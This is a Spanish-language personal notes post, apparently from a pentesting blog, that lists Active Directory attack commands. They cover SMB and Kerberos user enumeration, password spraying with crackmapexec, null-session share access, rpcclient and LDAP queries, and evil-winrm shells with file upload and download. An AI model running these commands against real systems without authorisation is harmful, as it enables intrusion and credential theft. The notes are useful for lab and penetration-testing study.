---
title: Active Directory
author: miguel3023
date: 2022-12-26
categories: [Notes]
tags: [Active Directory]
---
## CrackMapexec

Podemos ver información sobre el Windows ante el que nos estamos enfrentando de la siguiente forma:

```
❯ crackmapexec smb <ip>
```

También si estamos ante un DC (Domain Controller) podemos añadir al "/etc/hosts" algún dominio que hayamos encontrado con **crackmapexec** y también podemos añadirlos así

```
<ip vicitima>  dc dc.dominio dominio
```

Esto es para que ataques con kerberos, si está el kerberos expuesto, podamos efectuar ataques y no tengamos problema alguno.

También podemos enumerar por recursos compartidos a nivel de red, en este caso haciendo uso de un usuario "none". En ciertos casos puede funcionar

```
❯ crackmapexec smb <ip> -u "none" --shares
```

Podemos saber si credenciales que hayamos obtenido de alguna forma son válidas a nivel de sistema. Si como resultado nos pone un "+" es que son correctas

```
❯ crackmapexec smb <ip> -u 'user' -p 'password'
```

Podemos comprobar con "winrm" si un usuario hace parte del grupo "Remote Managment Users". Si nos pone "(Pwn3d!)" Entonces es que sí, claro, esto teniendo credenciales. Esto es gracias a que el puerto "5985" está abierto, que es el servicio de administración remota de windows. Luego nos podremos conectar con "evil-winrm" obteniendo una shell interactiva

```
❯ crackmapexec winrm <ip> -u 'user' -p 'password'
```

Con crackmapexec podemos por fuera bruta indicar una contraseña para que vaya probando con usuarios de un diccionario para ver si la contraseña es válida para cierto usuario probado en el diccionario

`--continue-on-success`: Es para que si encuentra una contraseña correcta para cierto usuario, no me pare el ataque sino que siga probando con los demás usuarios

```
❯ crackmapexec smb <ip> -u diccionario.txt -p 'password' --continue-on-success
```

## Smbmap

Si no funciona de la manera anterior también podemos usar **smbmap** para ver recursos compartidos a nivel de red haciendo uso de un usuario "none"

```
❯ smbmap -H <ip> -u none
```

## Smbclient

Podemos conectarnos a los recursos compartidos que hay a nivel de red para quizá poder descargarnos algún recurso interesante 

```
❯ smbclient //<ip>/<recurso compartido> -N
```


## Kerbrute

Con esta herramienta, gracias al puerto abierto de kerberos, podríamos enumerar usuarios en base a un dominio y la ip de la víctima. Esto en base a un diccionario que le especifiquemos 

```
❯ /opt/kerbrute/kerbrute userenum -d dominio.com --dc <ip victima> diccionario.txt
```

Recuerda que en entornos de Directorio Activo, si tienes usuarios potenciales, puedes efectuar un ASREPROAST attack. Esto lo puedes hacer con "impacket-GetNPUsers", que esta te pide el TGT y también tenemos el "impacket-GetUserSPNs" que es cuando ya tenemos credenciales válidas de un usuario

## Kerberoasting Attack

Si tenemos credenciales válidas, podemos efectuar este ataque. Esto en base al TGS (Ticket Granting Service) que luego será un hash y lo podremos crackear con fuerza bruta 

## Rpcclient

Con esta herramienta podemos conectarnos para ver cosas enumerar por cosas en la máquina victima

```
❯ rpcclient -U 'user%password' <ip>
```

`enumdomusers`: Podemos ver usuarios estando conectados 

`enumdomgroups`: Podemos enumerar por grupos estando conectados

`querydispinfo`: Podemos ver más información sobre los usuarios

`querygroupmem`: Podemos indicar el "rid" de un usuario que anteriormente descubrimos con "querydispinfo"

`queryuser`: Acá podemos colocar el "rid" en hexadecimal obtenido con querygroupmem para obtener info del usuario al cual le sacamos el "rid"

Ejemplo de "querygroupmem":

```
rpcclient $> querygroupmem 0x200 
```
También podemos con el parámetro "-c" ejecutar comandos del mismo sin tener que estar en una sesión

```
❯ rpcclient -U 'user%password' <ip> -c "enumdomusers"
```

## LdapSearch

Podemos ver información a base de credenciales que tengamos

`Nota`: Esto es extraido de [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap#ldapsearch)

```
❯ ldapsearch -x -H ldap://<ip> -D 'user@dominio.com' -w 'password' -b "DC=dominio,DC=com"
```

## Evil-winrm

Nos podemos conectar con credenciales a la máquina victima 

```
❯ evil-winrm -i <ip> -u "user" -p "passoword"
```

## Listando en Windows

Para ver los privilegios que tenemos como usuario en una máquina windows podemos hacer:

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /priv
```

Para ver los grupos a los que pertenecemos podemos hacer:

```
*Evil-WinRM* PS C:\Users\support\Desktop> net user <usuario>
```

Ó también podemos ver más a detalle los grupos así

```
*Evil-WinRM* PS C:\Users\support\Desktop> net group
```

Con evil-winrm podemos subirnos cosas a la máquina víctima (si tabulas y tienes la consola interactiva en el mismo directorio donde tienes el binario o fichero a subir, se te autocompletará)

```
*Evil-WinRM* PS C:\Users\support\Documents> upload <ruta de lo que nos queremos subir>

```

También te puedes descargar cosas con evil-winrm. Indicandole la ruta entera de lo que te quieres descargar y luego el nombre con el que te quieres descargar eso

```
*Evil-WinRM* PS C:\Users\support\Documents> download C:\Users\support\Documents\20221226133921_BloodHound.zip BH.zip
```

## Escaladas de privilegios

Hay un ataque para escalada de privilegios que puede ser [útil](https://miguel3023.github.io/posts/rbcd-attack/)

